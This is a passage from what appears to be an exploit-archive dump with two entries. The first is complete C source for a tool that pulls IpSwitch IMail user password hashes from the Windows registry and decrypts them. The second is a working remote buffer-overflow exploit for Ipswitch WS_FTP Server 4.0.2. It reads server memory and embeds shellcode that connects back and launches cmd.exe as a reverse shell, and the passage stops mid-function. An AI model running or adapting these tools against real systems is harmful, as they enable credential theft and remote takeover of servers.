* ""HKEY_LOCAL_MACHINE\SOFTWARE\IpSwitch\IMail\Domains\<domainname>\Users\<username>\Password"".
* Before decrypting password convert all upper case characters in the username to lower case
* characters. We use username as a key to decrypt our password.
* In order to get our plain text password, we do as follows:
* 1) Subtract hex code of first password hash character by the hex code of first username character.
*    The resulting hex code will be our first decrypted password character.
* 2) Repeat above step for the rest of the chars.
* Look below, everythin is dead simple ;)
* eg:
* USERNAME:  netmaniac
* PASSWORDHASH: D0CEE7D5CCD3D4C7D2E0CAEAD2D3
* --------------------------------------------
* D0 CE E7 D5 CC D3 D4 C7 D2 E0 CA EA D2 D3 <- password hash
* - 6E 65 74 6D 61 6E 69 61 63 6E 65 74 6D 61 <- hex codes of username
* n  e  t  m  a  n  i  a  c  n  e  t  m  a <- username is a key
* -----------------------------------------
* 62 69 73 68 6B 65 6B 66 6F 72 65 76 65 72 <- hex codes of decrypted password
* b  i  s  h  k  e  k  f  o  r  e  v  e  r <- actual decrypted password
* pwdhash_hex_code  username_hex_code  decrypted_password
* ------------------------------------------------------------------
*   D0   -  6E (n)   = 62 (b)
*   CE   -  65 (e)   = 69 (i)
*   E7   -  74 (t)   = 73 (s)
*   D5   -  6D (m)   = 68 (h)
*   CC   -  61 (a)   = 6B (k)
*   D3   -  6E (n)   = 65 (e)
*   D4   -  69 (i)   = 6B (k)
*   C7   -  61 (a)   = 66 (f)
*   D2   -  63 (c)   = 6F (o)
*   E0   -  6E (n)   = 72 (r)
*   CA   -  65 (e)   = 65 (e)
*   EA   -  74 (t)   = 76 (v)
*   D2   -  6D (m)   = 65 (e)
*   D3   -  61 (a)   = 72 (r)
* ------------------------------------------------------------------
* I've included a lil proggie to dump all the usernames/passwords from local machine's registry.
* Have fun!
* //Send bug reports to netmaniac[at]hotmail.KG
* Greets to: my man wintie from .au, Chintan Trivedi :), jin yean ;), Morphique
* [16/August/2004] Bishkek
int total_accs=0;
int total_domainz=0,total_domain_accs=0;
void greetz()
printf( ""\n\t--= [ IpSwitch IMail Server User Password Decrypter ver %s] =--\n\n""
""\t\t (c) 2004 by Adik ( netmaniac [at] hotmail.KG )\n\n\n"",VER);
void usage()
printf( ""------------------------------------------------------------------------\n"");
printf( "" Imailpwdump [-d] -- Dumps IMail Server user/pwds from local registry\n\n""
"" Imailpwdump [username] [passwordhash] -- User/PwdHash to decrypt\n\n""
"" eg: Imailpwdump netmaniac D0CEE7D5CCD3D4C7D2E0CAEAD2D3\n"");
printf( ""------------------------------------------------------------------------\n"");
void str2hex(char *hexstring, char *outbuff)
unsigned long tmp=0;
char tmpchr[5]="""";
memset(outbuff,0,strlen(outbuff));
if(strlen(hexstring) % 2)
printf("" Incorrect password hash!\n"");
exit(1);
if(strlen(hexstring)>MAXSIZE)
printf("" Password hash is too long! \n"");
exit(1);
for(unsigned int i=0, c=0; i<strlen(hexstring); i+=2, c++)
memcpy(tmpchr,hexstring+i,2);
tmp = strtoul(tmpchr,NULL,16);
outbuff[c] = (char)tmp;
void str2smallcase(char *input)
if(strlen(input)>MAXSIZE)
printf("" Username too long! \n"");
return;
for(unsigned int i=0;i<strlen(input);i++)
if(isalnum(input[i]) || input[i] == '-' || input[i]=='_' || input[i]=='.')
input[i] = tolower(input[i]);
else
printf("" Bad characters in username!\n Allowed characters: %s\n"",ALLOWED_USERNAME_CHARS);
return;
void populate(char *input,unsigned int size)
char tmp[MAX_NUM]="""";
unsigned int strl = strlen(input);
strcpy(tmp,input);
for(unsigned int i=strlen(input),c=0;i<size;i++,c++)
if(c==strl)
c=0;
input[i] = tmp[c];
input[i]='\0';
void imail_decrypt(char *username, char *pwdhash,char *outbuff)
if(strlen(pwdhash) <= strlen(username) )
memset(outbuff,0,sizeof(outbuff));
for(unsigned int i=0;i<strlen(pwdhash);i++)
outbuff[i] = (pwdhash[i]&0xff) - (username[i]&0xff);
outbuff[i]='\0';
void get_usr_pwds(char *subkey,char *usr)
long res;
HKEY hPwdKey;
char username[MAXSIZE]="""";
char passwdhash[MAXSIZE*2]="""", passwd[MAXSIZE]="""",clearpasswd[MAXSIZE]="""";
char fullname[MAXSIZE]="""";
char email[MAXSIZE]="""";
DWORD lType;
DWORD passwdhashsz=sizeof(passwdhash)-1,fullnamesz=MAXSIZE-1,emailsz=MAXSIZE-1;
res = RegOpenKeyEx(HKEY_LOCAL_MACHINE,subkey,0,KEY_ALL_ACCESS,&hPwdKey);
if(res!=ERROR_SUCCESS)
printf("" Error opening key %s! Error #:%d\n"",subkey,res);
exit(1);
if(RegQueryValueEx(hPwdKey,""Password"",0,&lType,(LPBYTE)passwdhash,&passwdhashsz)!= ERROR_SUCCESS)
RegCloseKey(hPwdKey);
return;
if(RegQueryValueEx(hPwdKey,""FullName"",0,&lType,(LPBYTE)fullname,&fullnamesz)!= ERROR_SUCCESS)
RegCloseKey(hPwdKey);
return;
if(RegQueryValueEx(hPwdKey,""MailAddr"",0,&lType,(LPBYTE)email,&emailsz)!=ERROR_SUCCESS)
RegCloseKey(hPwdKey);
return;
str2smallcase(usr);
strncpy(username,usr,sizeof(username)-1);
str2hex(passwdhash,passwd);
if(strlen(passwd)>strlen(username))
populate(username,strlen(passwd));
imail_decrypt(username,passwd,clearpasswd);
printf( ""------------------------------------------------------------------------\n""
"" FullName:\t %s\n""
"" Email:\t\t %s\n""
"" Username:\t %s\n""
"" Password:\t %s\n"",
fullname,email,usr,clearpasswd);
total_accs++;
RegCloseKey(hPwdKey);
void dump_registry_pwds()
HKEY hKey,hUserKey;
DWORD domRes=0,usrRes=0, domlen=0,userlen=0,domIndex=0,userIndex=0;
FILETIME ftime;
char domain[150]="""";
char user[150]="""";
char tmpbuff[MAX_NUM]="""";
char usrtmpbuff[MAX_NUM]="""";
domRes = RegOpenKeyEx(HKEY_LOCAL_MACHINE,DOMAINZ,0,KEY_ALL_ACCESS,&hKey);
if(domRes!=ERROR_SUCCESS)
printf("" Error opening key '%s'!\n IMail not installed?? Error #:%d\n"",DOMAINZ,domRes);
exit(1);
do
domlen=sizeof(domain)-1;
domRes=RegEnumKeyEx(hKey,domIndex,domain,&domlen,NULL,NULL,NULL,&ftime);
if(domRes!=ERROR_NO_MORE_ITEMS)
printf(""\n DOMAIN:\t [ %s ]\n"",domain);
userIndex=0;
total_accs=0;
snprintf(tmpbuff,sizeof(tmpbuff)-1,""%s\\%s\\Users"",DOMAINZ,domain);
usrRes = RegOpenKeyEx(HKEY_LOCAL_MACHINE,tmpbuff,0,KEY_ALL_ACCESS,&hUserKey);
if(usrRes==ERROR_SUCCESS)
do
userlen=sizeof(user)-1;
usrRes=RegEnumKeyEx(hUserKey,userIndex,user,&userlen,NULL,NULL,NULL,&ftime);
if(usrRes!=ERROR_NO_MORE_ITEMS)
snprintf(usrtmpbuff,sizeof(usrtmpbuff)-1,""%s\\%s\\Users\\%s"",DOMAINZ,domain,user);
get_usr_pwds(usrtmpbuff,user);
userIndex++;
while(usrRes!=ERROR_NO_MORE_ITEMS);
RegCloseKey(hUserKey);
printf(""\n\t Total:\t %d Accounts\n"",total_accs);
total_domain_accs += total_accs;
total_domainz++;
domIndex++;
while(domRes != ERROR_NO_MORE_ITEMS);
RegCloseKey(hKey);
printf(""\n Total:\t %d Domains, %d Accounts\n"",total_domainz,total_domain_accs);
void decrypt_usr_pass(char *usr,char *passwd)
char username[MAX_NUM]="""";
char passwordhash[MAX_NUM]="""";
char outputbuff[250]="""";
str2smallcase(usr);
strncpy(username,usr,sizeof(username)-1);
str2hex(passwd,passwordhash);
printf(""------------------------------------------------------------------------\n"");
printf( "" Username:\t\t %s\n""
"" Passwordhash:\t\t %s\n"",usr,passwd);
if(strlen(passwordhash)>strlen(username))
populate(username,strlen(passwordhash));
imail_decrypt(username,passwordhash,outputbuff);
printf("" Decrypted passwd:\t %s\n"",outputbuff);
printf(""------------------------------------------------------------------------\n"");
void main(int argc, char *argv[])
greetz();
if(argc ==2 && strncmp(argv[1],""-d"",2)==0 )
dump_registry_pwds();
else if(argc == 3 && strncmp(argv[1],""-d"",2)!=0)
decrypt_usr_pass(argv[1],argv[2]);
else
usage();
return;"
2004-03-23,Remote,Windows,Hugh Mann,Ipswitch WS_FTP Server 4.0.2,ALLO Remote Buffer Overflow,"#include <winsock2.h>
#pragma comment(lib, ""ws2_32.lib"")
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#define ALLO_STRING ""ALLO 18446744073709551615""
#if 1
#else
// mswsock.dll is not loaded by WS_FTP Server, and I haven't investigated which DLL actually loads it
// so I don't use this possibly better return address.
#endif
#define MAXLINE 0x1000
#define XAUT_2_KEY 0x49327576
// Don't want UTF8 conversions
// Server thread crashed
// milw0rm.com [2004-03-23]","* Ipswitch WS_FTP Server <= 4.0.2 ALLO exploit
* (c)2004 Hugh Mann hughmann@hotmail.com
* This exploit has been tested with WS_FTP Server 4.0.2.EVAL, Windows XP SP1
* NOTE:
* - The exploit assumes the user has a total file size limit. If the user only has
* a max number of files limit you will need to rewrite parts of this exploit for
* it to work.
const char* temp_file = ""#t#t#t"";
* Assume all addresses >= this address to be invalid addresses. If the exploit doesn't work,
* try changing it to a larger value, eg. 0x80000000 or 0xC0000000.
const MAX_ADDR = 0x80000000;
* Size of each thread's stack space. From iFtpSvc.exe PE header. Must be a power of 2.
* Should not be necessary to change this since practically all PE files use the default
* size (1MB).
const SERV_STK_SIZE = 0x00100000;
* This is the lower bits of ESP when the ALLO handler is called. This is very WS_FTP Server
* version dependent. Should be = ESP (mod SERV_STK_SIZE)
const SERV_STK_OFFS = 0x0007F208;
* This is the offset of the ""this"" pointer relative to SERV_STK_OFFS in the ALLO handler.
const SERV_STK_THIS_OFFS = -(0x210+4); // EBP is saved
* Offset of username relative to the ""this"" pointer
const SERV_THIS_USERNAME_OFFS = 0x9F8;
* Offset of FTP cmd buf relative to the ""this"" pointer
const SERV_THIS_CMDBUF_OFFS = 0x1F8;
* Offset of EIP relative to vulnerable buffer
const SERV_BUF_EIP = 0x110;
* Return addresses to JMP ESP instruction. Must contain bytes that are valid shellcode characters.
const char* ret_addr = ""\xD3\xD9\xE2\x77""; // advapi32.dll (08/29/2002), WinXP SP1
const char* ret_addr = ""\x3D\x40\xA5\x71""; // mswsock.dll (08/23/2001), WinXP SP1 and probably WinXP too
static char inbuf[MAXLINE];
static unsigned inoffs = 0;
static char last_line[MAXLINE];
static int output_all = 0;
static int quite_you = 0;
void msg2(const char *format, ...)
va_list args;
va_start(args, format);
vfprintf(stdout, format, args);
void msg(const char *format, ...)
if (quite_you && output_all == 0)
return;
va_list args;
va_start(args, format);
vfprintf(stdout, format, args);
int isrd(SOCKET s)
fd_set r;
FD_ZERO(&r);
FD_SET(s, &r);
timeval t = {0, 0};
int ret = select(1, &r, NULL, NULL, &t);
if (ret < 0)
return 0;
else
return ret != 0;
void print_all(const char* buf, int len = -1)
if (len == -1)
len = (int)strlen(buf);
for (int i = 0; i < len; i++)
putc(buf[i], stdout);
int _recv(SOCKET s, char* buf, int len, int flags)
int ret = recv(s, buf, len, flags);
if (!output_all || ret < 0)
return ret;
print_all(buf, ret);
return ret;
int get_line(SOCKET s, char* string, unsigned len)
char* nl;
while ((nl = (char*)memchr(inbuf, '\n', inoffs)) == NULL)
if (inoffs >= sizeof(inbuf))
msg(""[-] Too long line\n"");
return 0;
int len = _recv(s, &inbuf[inoffs], sizeof(inbuf) - inoffs, 0);
if (len <= 0)
msg(""[-] Error receiving data\n"");
return 0;
inoffs += len;
strncpy(last_line, inbuf, sizeof(last_line));
last_line[sizeof(last_line)-1] = 0;
unsigned nlidx = (unsigned)(ULONG_PTR)(nl - inbuf);
if (nlidx >= len)
msg(""[-] Too small caller buffer\n"");
return 0;
memcpy(string, inbuf, nlidx);
string[nlidx] = 0;
if (nlidx > 0 && string[nlidx-1] == '\r')
string[nlidx-1] = 0;
if (nlidx + 1 >= inoffs)
inoffs = 0;
else
memcpy(inbuf, &inbuf[nlidx+1], inoffs - (nlidx + 1));
inoffs -= nlidx + 1;
return 1;
int ignorerd(SOCKET s)
inoffs = 0;
while (1)
if (!isrd(s))
return 1;
if (_recv(s, inbuf, sizeof(inbuf), 0) < 0)
return 0;
int get_reply_code(SOCKET s, int (*func)(void* data, char* line) = NULL, void* data = NULL)
char line[MAXLINE];
if (!get_line(s, line, sizeof(line)))
msg(""[-] Could not get status code\n"");
return -1;
if (func)
func(data, line);
char c = line[3];
line[3] = 0;
int code;
if (!(c == ' ' || c == '-') || strlen(line) != 3 || !(code = atoi(line)))
msg(""[-] Weird reply\n"");
return -1;
char endline[4];
memcpy(endline, line, 3);
endline[3] = ' ';
if (c == '-')
while (1)
if (!get_line(s, line, sizeof(line)))
msg(""[-] Could not get next line\n"");
return -1;
if (func)
func(data, line);
if (!memcmp(line, endline, sizeof(endline)))
break;
return code;
int sendb(SOCKET s, const char* buf, int len, int flags = 0)
while (len)
int l = send(s, buf, len, flags);
if (l <= 0)
break;
len -= l;
buf += l;
return len == 0;
int sends(SOCKET s, const char* buf, int flags = 0)
return sendb(s, buf, (int)strlen(buf), flags);
int _send_cmd(SOCKET s, const char* fmt, va_list args, int need_reply)
char buf[MAXLINE];
buf[sizeof(buf)-1] = 0;
if (_vsnprintf(buf, sizeof(buf), fmt, args) < 0 || buf[sizeof(buf)-1] != 0)
msg(""[-] Buffer overflow\n"");
return -1;
if (output_all)
print_all(buf);
if (!ignorerd(s) || !sends(s, buf))
return -1;
if (need_reply)
return get_reply_code(s);
return 0;
int send_cmd(SOCKET s, const char* fmt, ...)
va_list args;
va_start(args, fmt);
return _send_cmd(s, fmt, args, 1);
int send_cmd2(SOCKET s, const char* fmt, ...)
va_list args;
va_start(args, fmt);
return _send_cmd(s, fmt, args, 0);
int add_bytes(void* dst, int& dstoffs, int dstlen, const void* src, int srclen)
if (dstoffs < 0 || dstoffs + srclen > dstlen || dstoffs + srclen < dstoffs)
msg(""[-] Buffer overflow ;)\n"");
return 0;
memcpy((char*)dst+dstoffs, src, srclen);
dstoffs += srclen;
return 1;
int check_invd_bytes(const char* name, const void* buf, int buflen, int (*chkchar)(char c))
const char* b = (const char*)buf;
for (int i = 0; i < buflen; i++)
if (!chkchar(b[i]))
msg(""[-] %s[%u] (%02X) is an invalid character\n"", name, i, (unsigned char)b[i]);
return 0;
return 1;
int enc_byte(char& c, char& k, int (*chkchar)(char c))
for (int i = 0; i < 0x100; i++)
if (!chkchar(c ^ i) || !chkchar(i))
continue;
c ^= i;
k = i;
return 1;
msg(""[-] Could not find encryption key for byte %02X\n"", c);
return 0;
int get_enc_key(char* buf, int size, int offs, int step, int (*chkchar)(char c), int ignore1 = -1, int ignore2 = -1)
for (int i = 0; i < 0x100; i++)
if (!chkchar(i))
continue;
for (int j = offs; j < size; j += step)
if (ignore1 != -1 && (j >= ignore1 && j <= ignore2))
continue; // These bytes aren't encrypted
if (!chkchar(buf[j] ^ i))
break;
if (j < size)
continue;
return i;
msg(""[-] Could not find an encryption key\n"");
return -1;
int login(SOCKET s, const char* username, const char* userpass)
msg(""[+] Logging in as %s...\n"", username);
int code;
if ((code = send_cmd(s, ""USER %s\r\n"", username)) < 0)
msg(""[-] Failed to log in #1\n"");
return 0;
if (code == 331)
if ((code = send_cmd(s, ""PASS %s\r\n"", userpass)) < 0)
msg(""[-] Failed to log in #2\n"");
return 0;
if (code != 230)
msg(""[-] Failed to log in. Code %3u\n"", code);
return 0;
msg(""[+] Logged in\n"");
return 1;
class xuser
public:
xuser() : s(INVALID_SOCKET) {}
~xuser() {close();}
int init(unsigned long ip, unsigned short port, const char* username, const char* userpass);
void close() {if (s >= 0) closesocket(s); s = INVALID_SOCKET;}
SOCKET sock() const {return s;}
int exploit(unsigned long sip, unsigned short sport);
int read_serv_mem_bytes(unsigned addr, void* dst, int dstlen);
int read_serv_mem_string(unsigned addr, char* dst, int dstlen);
int read_serv_mem_uint32(unsigned addr, unsigned* dst);
protected:
int read_serv_mem(unsigned addr, void* dst, int dstlen);
SOCKET s;
char username[260];
char userpass[260];
unsigned long ip;
unsigned short port;
* XAUT code tested with WS_FTP Server 4.0.2.EVAL
int xaut_encrypt(char* dst, const char* src, int len, unsigned long key)
unsigned char keybuf[0x80*4];
for (int i = 0; i < sizeof(keybuf)/4; i++)
keybuf[i*4+0] = (char)key;
keybuf[i*4+1] = (char)(key >> 8);
keybuf[i*4+2] = (char)(key >> 16);
keybuf[i*4+3] = (char)(key >> 24);
for (int i = 0; i < len; i++)
if (i >= sizeof(keybuf))
msg(""[-] xaut_encrypt: Too long input buffer\n"");
return 0;
*dst++ = *src++ ^ keybuf[i];
return 1;
char* xaut_unpack(char* src, int len, int delete_it)
char* dst = new char[len*2 + 1];
for (int i = 0; i < len; i++)
dst[i*2+0] = ((src[i] >> 4) & 0x0F) + 0x35;
dst[i*2+1] = (src[i] & 0x0F) + 0x31;
dst[i*2] = 0;
if (delete_it)
delete src;
return dst;
int xaut_login(SOCKET s, int d, const char* username, const char* password, unsigned long key)
msg(""[+] Logging in [XAUT] as %s...\n"", username);
int ret = 0;
char* dst = NULL;
__try
const char* middle = "":"";
dst = new char[strlen(username) + strlen(middle) + strlen(password) + 1];
strcpy(dst, username);
strcat(dst, middle);
strcat(dst, password);
int len = (int)strlen(dst);
if ((d == 2 && !xaut_encrypt(dst, dst, len, XAUT_2_KEY)) || !xaut_encrypt(dst, dst, len, key))
__leave;
dst = xaut_unpack(dst, len, 1);
if (send_cmd(s, ""XAUT %d %s\r\n"", d, dst) != 230)
__leave;
ret = 1;
__finally
delete dst;
if (!ret)
msg(""[-] Failed to log in\n"");
else
msg(""[+] Logged in\n"");
return ret;
struct my_data
unsigned long key;
int done_that;
char hostname[256];
int line_callback(void* data, char* line)
my_data* m = (my_data*)data;
if (m->done_that)
return 1;
* Looking for a line similar to:
* ""220-FTP_HOSTNAME X2 WS_FTP Server 4.0.2.EVAL (41541732)\r\n""
char* s, *e;
if (strncmp(line, ""220"", 3) || !strstr(line, ""WS_FTP Server"") ||
(s = strrchr(line, '(')) == NULL || (e = strchr(s, ')')) == NULL)
return 1;
char buf[0x10];
int len = (int)(ULONG_PTR)(e - (s+1));
if (len >= sizeof(buf) || len > 10)
return 1;
memcpy(buf, s+1, len);
buf[len] = 0;
for (int i = 0; i < len; i++)
if (!isdigit((unsigned char)buf[i]))
return 1;
m->key = atol(buf);
for (int i = 4, len = (int)strlen(line); i < len; i++)
if (i-4 >= sizeof(m->hostname))
return 1;
m->hostname[i-4] = line[i];
if (line[i] == ' ')
break;
m->hostname[i-4] = 0;
if (m->hostname[0] == 0)
return 1;
m->done_that = 1;
return 1;
int xuser::init(unsigned long _ip, unsigned short _port, const char* _username, const char* _userpass)
ip = _ip;
port = _port;
close();
strncpy(username, _username, sizeof(username));
if (username[sizeof(username)-1] != 0)
msg(""[-] username too long\n"");
return 0;
strncpy(userpass, _userpass, sizeof(userpass));
if (userpass[sizeof(userpass)-1] != 0)
msg(""[-] userpass too long\n"");
return 0;
sockaddr_in saddr;
memset(&saddr, 0, sizeof(saddr));
saddr.sin_family = AF_INET;
saddr.sin_port = htons(port);
saddr.sin_addr.s_addr = htonl(ip);
in_addr a; a.s_addr = htonl(ip);
msg(""[+] Connecting to %s:%u...\n"", inet_ntoa(a), port);
s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
if (s < 0 || connect(s, (sockaddr*)&saddr, sizeof(saddr)) < 0)
msg(""[-] Could not connect\n"");
return 0;
msg(""[+] Connected\n"");
my_data m;
memset(&m, 0, sizeof(m));
int code = get_reply_code(s, line_callback, &m);
if (code != 220)
msg(""[-] Got reply %3u\n"", code);
return 0;
else if (!m.done_that)
msg(""[-] Could not find XAUT key or host name => Not a WS_FTP Server\n"");
return 0;
if (!xaut_login(s, 0, username, userpass, m.key) && !login(s, username, userpass))
return 0;
if (send_cmd(s, ""LANG en\r\n"") != 200)
msg(""[-] Apparently they don't understand the english language\n"");
return 0;
if (send_cmd(s, ""NOOP step into the light\r\n"") != 200)
msg(""[-] C4n't k1ll 4 z0mbie\n"");
return 0;
return 1;
SOCKET get_data_sock(SOCKET s, const char* filename, const char* cmd)
SOCKET sd = INVALID_SOCKET;
int error = 1;
__try
sockaddr_in saddr;
int len = sizeof(saddr);
if (getsockname(s, (sockaddr*)&saddr, &len) < 0 || len != sizeof(saddr) ||
(sd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) < 0)
__leave;
sockaddr_in daddr;
memset(&daddr, 0, sizeof(daddr));
daddr.sin_family = AF_INET;
daddr.sin_port = 0;
daddr.sin_addr.s_addr = saddr.sin_addr.s_addr;
len = sizeof(daddr);
if (bind(sd, (sockaddr*)&daddr, sizeof(daddr)) < 0 || listen(sd, 1) < 0 ||
getsockname(sd, (sockaddr*)&daddr, &len) < 0 || len != sizeof(daddr))
__leave;
unsigned long ip = ntohl(daddr.sin_addr.s_addr);
unsigned short port = ntohs(daddr.sin_port);
if (send_cmd(s, ""PORT %u,%u,%u,%u,%u,%u\r\n"",
(unsigned char)(ip >> 24),
(unsigned char)(ip >> 16),
(unsigned char)(ip >> 8),
(unsigned char)ip,
(unsigned char)(port >> 8),
(unsigned char)port) != 200)
__leave;
if (send_cmd2(s, ""%s %s\r\n"", cmd, filename) < 0)
__leave;
msg(""[+] Waiting for server to connect...\n"");
SOCKET sa;
sockaddr_in aaddr;
len = sizeof(aaddr);
if ((sa = accept(sd, (sockaddr*)&aaddr, &len)) < 0)
__leave;
closesocket(sd);
sd = sa;
if (get_reply_code(s) != 150)
__leave;
error = 0;
__finally
if (error)
msg(""[-] Could not create data connection, %u\n"", GetLastError());
closesocket(sd);
sd = INVALID_SOCKET;
else
msg(""[+] Server connected\n"");
return sd;
int create_file(SOCKET s, const char* tmpname, unsigned size = 1)
int ret = 0;
SOCKET sd = INVALID_SOCKET;
__try
if (size > 1 && send_cmd(s, ""REST %u\r\n"", size) != 350)
__leave;
if ((sd = get_data_sock(s, tmpname, ""STOR"")) < 0)
__leave;
ret = 1;
__finally
if (sd >= 0)
closesocket(sd);
if (ret && get_reply_code(s) != 226)
ret = 0;
return ret;
const unsigned int shlc2_offs_encstart = 0x0000002B;
const unsigned int shlc2_offs_encend = 0x000001B8;
const unsigned int shlc2_offs_enckey = 0x00000025;
unsigned char shlc2_code[] =
""\xEB\x16\x78\x56\x34\x12\x78\x56\x34\x12\x78\x56\x34\x12\x78\x56""
""\x34\x12\x5B\x53\x83\xEB\x1D\xC3\xE8\xF5\xFF\xFF\xFF\x33\xC9\xB1""
""\x64\x81\x74\x8B\x27\x55\x55\x55\x55\xE2\xF6\xFC\x8B\x43\x0A\x31""
""\x43\x02\x8B\x43\x0E\x31\x43\x06\x89\x4B\x0A\x89\x4B\x0E\x64\x8B""
""\x35\x30\x00\x00\x00\x8B\x76\x0C\x8B\x76\x1C\xAD\x8B\x68\x08\x8D""
""\x83\x67\x01\x00\x00\x55\xE8\xB7\x00\x00\x00\x68\x33\x32\x00\x00""
""\x68\x77\x73\x32\x5F\x54\xFF\xD0\x96\x8D\x83\x74\x01\x00\x00\x56""
""\xE8\x9D\x00\x00\x00\x81\xEC\x90\x01\x00\x00\x54\x68\x01\x01\x00""
""\x00\xFF\xD0\x8D\x83\x7F\x01\x00\x00\x56\xE8\x83\x00\x00\x00\x33""
""\xC9\x51\x51\x51\x6A\x06\x6A\x01\x6A\x02\xFF\xD0\x97\x8D\x83\x8A""
""\x01\x00\x00\x56\xE8\x69\x00\x00\x00\x33\xC9\x51\x51\x51\x51\x6A""
""\x10\x8D\x4B\x02\x51\x57\xFF\xD0\xB9\x54\x00\x00\x00\x2B\xE1\x88""
""\x6C\x0C\xFF\xE2\xFA\xC6\x44\x24\x10\x44\x41\x88\x4C\x24\x3C\x88""
""\x4C\x24\x3D\x89\x7C\x24\x48\x89\x7C\x24\x4C\x89\x7C\x24\x50\x49""
""\x8D\x44\x24\x10\x54\x50\x51\x51\x51\x6A\x01\x51\x51\x8D\x83\xA4""
""\x01\x00\x00\x50\x51\x8D\x83\x95\x01\x00\x00\x55\xE8\x11\x00\x00""
""\x00\x59\xFF\xD0\x8D\x83\xAC\x01\x00\x00\x55\xE8\x02\x00\x00\x00""
""\xFF\xD0\x60\x8B\x7C\x24\x24\x8D\x6F\x78\x03\x6F\x3C\x8B\x6D\x00""
""\x03\xEF\x83\xC9\xFF\x41\x3B\x4D\x18\x72\x0B\x64\x89\x0D\x00\x00""
""\x00\x00\x8B\xE1\xFF\xE4\x8B\x5D\x20\x03\xDF\x8B\x1C\x8B\x03\xDF""
""\x8B\x74\x24\x1C\xAC\x38\x03\x75\xDC\x43\x84\xC0\x75\xF6\x8B\x5D""
""\x24\x03\xDF\x0F\xB7\x0C\x4B\x8B\x5D\x1C\x03\xDF\x8B\x0C\x8B\x03""
""\xCF\x89\x4C\x24\x1C\x61\xC3\x4C\x6F\x61\x64\x4C\x69\x62\x72\x61""
""\x72\x79\x41\x00\x57\x53\x41\x53\x74\x61\x72\x74\x75\x70\x00\x57""
""\x53\x41\x53\x6F\x63\x6B\x65\x74\x41\x00\x57\x53\x41\x43\x6F\x6E""
""\x6E\x65\x63\x74\x00\x43\x72\x65\x61\x74\x65\x50\x72\x6F\x63\x65""
""\x73\x73\x41\x00\x63\x6D\x64\x2E\x65\x78\x65\x00\x45\x78\x69\x74""
""\x50\x72\x6F\x63\x65\x73\x73\x00"";
int is_valid_shlc2(char c)
return c != 0;
struct tfs_data
tfs_data() : tot_size(0), line(0), ok(0) {}
int line;
unsigned tot_size;
int ok;
int tfs_line_callback(void* data, char* line)
tfs_data* m = (tfs_data*)data;
if (++m->line != 1)
return 1;
if (strncmp(line, ""250-"", 4) ||
(m->tot_size = atoi(line+4)) == 0)
return 1;
m->ok = 1;
return 1;
int get_user_total_file_size(SOCKET s, unsigned& tot_size)
int ret = 0;
SOCKET sd = INVALID_SOCKET;
__try
* Create a $message.txt file
if ((sd = get_data_sock(s, ""$message.txt"", ""STOR"")) < 0 ||
send(sd, ""%z"", 2, 0) != 2)
__leave;
closesocket(sd);
sd = INVALID_SOCKET;
if (get_reply_code(s) != 226)
__leave;
tfs_data m;
const DWORD max_wait = 10000;
for (DWORD tc = GetTickCount(); GetTickCount() - tc < max_wait; )
if (send_cmd2(s, ""CWD .\r\n"") < 0)
__leave;
m.ok = m.line = 0;
int code = get_reply_code(s, tfs_line_callback, &m);
if (code != 500)
break;
if (!m.ok)
__leave;
tot_size = m.tot_size;
ret = 1;
__finally
if (sd >= 0)
closesocket(sd);
if (!ret)
msg(""[-] Failed to get user total file size.\n Are you sure there's a total file size limit for this user?\n"");
return ret;
int delete_file(SOCKET s, const char* filename)
DWORD tc = GetTickCount();
const DWORD wait = 10000;
while (1)
if (GetTickCount() - tc > wait)
return 0;
if (send_cmd(s, ""STAT %s\r\n"", filename) != 211)
return 1;
if (send_cmd(s, ""DELE %s\r\n"", filename) < 0)
return 0;
int create_file_for_addr(SOCKET s, unsigned addr)
int ret = 0;
__try
if (addr >= MAX_ADDR)
msg2(""[-] Trying to read an addr (%08X) >= MAX_ADDR (%08X)\n"", addr, MAX_ADDR);
__leave;
if (!delete_file(s, temp_file))
msg(""[-] Could not delete file\n"");
unsigned tot_size;
if (!get_user_total_file_size(s, tot_size))
__leave;
if (addr < tot_size)
msg2(""[-] You must delete some user files to read address %08X\n"", addr);
__leave;
unsigned size = addr - tot_size;
if (!create_file(s, temp_file, size))
__leave;
ret = 1;
__finally
return ret;
* Returns < 0 => error
* Returns = 0 => server thread crashed
* Returns > 0 => read this many bytes into dst
int xuser::read_serv_mem(unsigned addr, void* dst, int dstlen)
int file_created = 0;
int ret = -1;
__try
if (!create_file_for_addr(s, addr))
__leave;
file_created = 1;
if (send_cmd2(s, ALLO_STRING ""\r\n"") < 0)
__leave;
char buf[MAXLINE];
int bufsz = 0;
const char* m1 = ""452 "";
int type = 0;
while (1)
if (bufsz >= sizeof(buf)-1)
__leave;
int size = _recv(s, &buf[bufsz], sizeof(buf)-1-bufsz, 0);
if (size < 0)
__leave;
if (size == 0)
if (bufsz == 0)
ret = 0;
__leave;
bufsz += size;
buf[bufsz] = 0;
if (bufsz >= (int)strlen(m1) && memcmp(m1, buf, strlen(m1)))
__leave; // Wrong reply code
const char* s1 = "" files\r\n"";
const char* s2 = "" size\r\n"";
if (bufsz >= (int)strlen(s1) && !memcmp(s1, &buf[bufsz-strlen(s1)], strlen(s1)))
type = 0;
break;
if (bufsz >= (int)strlen(s2) && !memcmp(s2, &buf[bufsz-strlen(s2)], strlen(s2)))
type = 1;
break;
const char* s = ""quota exceeded; "";
const char* f1 = "" size; "";
const char* f2 = "" size\r\n"";
const char* f3 = "" files; "";
char* b = buf + strlen(m1);
if (strncmp(b, s, strlen(s)))
__leave;
char* ss = NULL, *se = NULL;
if (type == 0) // ""quota exceeded; %s size; %u files\r\n""
ss = b + strlen(s);
for (int i = bufsz-(int)strlen(f1); ; i--)
if (i < 0)
__leave;
if (strncmp(f1, &buf[i], strlen(f1)))
continue; // Not equal to "" size; ""
se = &buf[i];
break;
else // ""quota exceeded; %u files; %s size\r\n""
ss = strstr(buf, f3);
if (!ss)
__leave;
ss += strlen(f3);
se = &buf[bufsz-strlen(f2)];
if (!se || !ss || se < ss)
msg(""[-] Buggy code\n"");
__leave;
*se = 0;
int rd_size = (int)(UINT_PTR)(se - ss) + 1; // One 00h byte
ret = min((int)dstlen, rd_size);
memcpy(dst, ss, ret);
__finally
if (ret < 0)
msg(""[-] Could not read server memory\n"");
else if (ret == 0)
if (!init(ip, port, username, userpass))
ret = -1;
return ret;
int xuser::read_serv_mem_bytes(unsigned addr, void* dst, int dstlen)
for (int i = 0; i < (int)dstlen; )
